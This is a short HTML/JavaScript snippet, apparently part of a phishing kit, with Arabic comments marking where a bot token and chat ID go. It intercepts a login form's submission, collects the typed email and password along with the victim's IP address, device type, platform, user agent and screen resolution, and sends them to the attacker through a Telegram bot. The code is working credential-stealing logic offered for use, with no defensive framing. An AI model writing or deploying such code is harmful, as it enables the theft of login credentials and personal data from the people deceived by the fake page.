<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "";                                                            // هنا التوكين              
    const CHAT_ID = "";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>
